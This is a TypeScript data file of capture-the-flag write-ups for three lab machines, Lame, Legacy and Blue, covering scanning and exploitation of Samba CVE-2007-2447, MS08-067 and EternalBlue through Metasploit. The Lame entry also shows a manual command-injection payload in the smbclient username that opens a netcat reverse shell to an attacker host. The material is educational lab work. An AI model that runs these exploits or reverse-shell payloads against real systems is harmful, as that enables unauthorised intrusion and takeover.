export interface MachineWriteup {
  name: string
  os: string
  difficulty: string
  points: number
  date: string
  tags: string[]
  image?: string
  sections: {
    title: string
    content: {
      type: "text" | "code" | "list" | "info" | "warning" | "success"
      content?: string
      language?: string
      items?: string[]
    }[]
  }[]
}

export const machineWriteups: Record<string, MachineWriteup> = {
  lame: {
    name: "Lame",
    os: "Linux",
    difficulty: "Easy",
    points: 20,
    date: "2024-01-15",
    tags: ["SMB", "CVE-2007-2447", "Samba"],
    image: "/placeholder.svg?height=400&width=600",
    sections: [
      {
        title: "Summary",
        content: [
          {
            type: "text",
            content:
              "Lame is an easy Linux machine that demonstrates exploitation of the Samba service vulnerability CVE-2007-2447. This machine is perfect for beginners to learn basic enumeration and exploitation techniques.",
          },
          {
            type: "info",
            content:
              "This writeup covers the complete process from initial reconnaissance to gaining root access on the target machine.",
          },
        ],
      },
      {
        title: "Reconnaissance",
        content: [
          {
            type: "text",
            content: "Starting with an Nmap scan to identify open ports and services:",
          },
          {
            type: "code",
            language: "bash",
            content: `# Initial port scan
nmap -sC -sV -oA lame 10.10.10.3

# Results show:
# 21/tcp  open  ftp         vsftpd 2.3.4
# 22/tcp  open  ssh         OpenSSH 4.7p1
# 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
# 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian`,
          },
          {
            type: "text",
            content:
              "The scan reveals several interesting services, particularly the Samba service running version 3.0.20.",
          },
        ],
      },
      {
        title: "Enumeration",
        content: [
          {
            type: "text",
            content: "Let's enumerate the SMB service further:",
          },
          {
            type: "code",
            language: "bash",
            content: `# SMB enumeration
smbclient -L //10.10.10.3

# Check for null session
smbclient //10.10.10.3/tmp

# Enumerate shares
enum4linux 10.10.10.3`,
          },
          {
            type: "list",
            items: [
              "FTP service running vsftpd 2.3.4 (known vulnerable version)",
              "SSH service on port 22",
              "Samba 3.0.20 running on ports 139/445",
              "Anonymous access allowed to some SMB shares",
            ],
          },
        ],
      },
      {
        title: "Exploitation",
        content: [
          {
            type: "text",
            content:
              "The Samba version 3.0.20 is vulnerable to CVE-2007-2447, which allows command injection through username field:",
          },
          {
            type: "code",
            language: "bash",
            content: `# Using Metasploit
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.x
exploit

# Manual exploitation
smbclient //10.10.10.3/tmp
logon "./=\`nohup nc -e /bin/sh 10.10.14.x 4444\`"`,
          },
          {
            type: "success",
            content: "Successfully gained root shell! The vulnerability allows direct command execution as root user.",
          },
        ],
      },
      {
        title: "Post-Exploitation",
        content: [
          {
            type: "text",
            content: "Once we have shell access, we can retrieve the flags:",
          },
          {
            type: "code",
            language: "bash",
            content: `# Check current user
whoami
# root

# Get user flag
cat /home/makis/user.txt

# Get root flag  
cat /root/root.txt`,
          },
          {
            type: "info",
            content:
              "Since we gained root access directly through the Samba exploit, no privilege escalation was necessary.",
          },
        ],
      },
      {
        title: "Key Takeaways",
        content: [
          {
            type: "list",
            items: [
              "Always check for known vulnerabilities in identified service versions",
              "Samba usermap_script vulnerability allows direct command injection",
              "Proper enumeration is crucial for identifying attack vectors",
              "Some vulnerabilities provide immediate root access without privilege escalation",
            ],
          },
        ],
      },
    ],
  },
  legacy: {
    name: "Legacy",
    os: "Windows",
    difficulty: "Easy",
    points: 20,
    date: "2024-01-14",
    tags: ["MS08-067", "Buffer Overflow", "SMB"],
    image: "/placeholder.svg?height=400&width=600",
    sections: [
      {
        title: "Summary",
        content: [
          {
            type: "text",
            content:
              "Legacy is an easy Windows machine vulnerable to MS08-067, a critical vulnerability in the Server service that allows remote code execution. This machine demonstrates exploitation of a classic Windows vulnerability.",
          },
        ],
      },
      {
        title: "Reconnaissance",
        content: [
          {
            type: "code",
            language: "bash",
            content: `# Nmap scan
nmap -sC -sV -oA legacy 10.10.10.4

# Results:
# 135/tcp open  msrpc   Microsoft Windows RPC
# 139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
# 445/tcp open  microsoft-ds Windows XP microsoft-ds`,
          },
        ],
      },
      {
        title: "Vulnerability Assessment",
        content: [
          {
            type: "text",
            content: "Running vulnerability scans to identify potential exploits:",
          },
          {
            type: "code",
            language: "bash",
            content: `# Nmap vulnerability scan
nmap --script vuln 10.10.10.4

# Results show MS08-067 vulnerability
nmap --script smb-vuln-ms08-067 10.10.10.4`,
          },
          {
            type: "warning",
            content: "MS08-067 is a critical vulnerability that can cause system instability. Use with caution.",
          },
        ],
      },
      {
        title: "Exploitation",
        content: [
          {
            type: "code",
            language: "bash",
            content: `# Using Metasploit
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set LHOST 10.10.14.x
exploit`,
          },
          {
            type: "success",
            content: "Successfully gained SYSTEM level access on the Windows XP machine.",
          },
        ],
      },
      {
        title: "Flag Retrieval",
        content: [
          {
            type: "code",
            language: "cmd",
            content: `# Navigate to user directory
cd C:\\Documents and Settings\\john\\Desktop
type user.txt

# Navigate to Administrator directory
cd C:\\Documents and Settings\\Administrator\\Desktop  
type root.txt`,
          },
        ],
      },
    ],
  },
  blue: {
    name: "Blue",
    os: "Windows",
    difficulty: "Easy",
    points: 20,
    date: "2024-01-13",
    tags: ["MS17-010", "EternalBlue", "SMB"],
    image: "/placeholder.svg?height=400&width=600",
    sections: [
      {
        title: "Summary",
        content: [
          {
            type: "text",
            content:
              "Blue is an easy Windows machine vulnerable to MS17-010 (EternalBlue), the famous NSA exploit leaked by Shadow Brokers. This vulnerability was used in the WannaCry ransomware attack.",
          },
        ],
      },
      {
        title: "Reconnaissance",
        content: [
          {
            type: "code",
            language: "bash",
            content: `# Nmap scan
nmap -sC -sV -oA blue 10.10.10.40

# Key ports:
# 135/tcp open  msrpc
# 139/tcp open  netbios-ssn
# 445/tcp open  microsoft-ds Windows 7 Professional microsoft-ds`,
          },
        ],
      },
      {
        title: "Vulnerability Detection",
        content: [
          {
            type: "code",
            language: "bash",
            content: `# Check for EternalBlue vulnerability
nmap --script smb-vuln-ms17-010 10.10.10.40

# Alternative check
nmap --script vuln 10.10.10.40`,
          },
          {
            type: "success",
            content: "Target is confirmed vulnerable to MS17-010 (EternalBlue).",
          },
        ],
      },
      {
        title: "Exploitation",
        content: [
          {
            type: "code",
            language: "bash",
            content: `# Using Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.x
set payload windows/x64/meterpreter/reverse_tcp
exploit`,
          },
          {
            type: "info",
            content: "EternalBlue provides SYSTEM level access immediately upon successful exploitation.",
          },
        ],
      },
      {
        title: "Post-Exploitation",
        content: [
          {
            type: "code",
            language: "cmd",
            content: `# Check privileges
getuid
# NT AUTHORITY\\SYSTEM

# Retrieve flags
cd C:\\Users\\haris\\Desktop
type user.txt

cd C:\\Users\\Administrator\\Desktop
type root.txt`,
          },
        ],
      },
    ],
  },
}
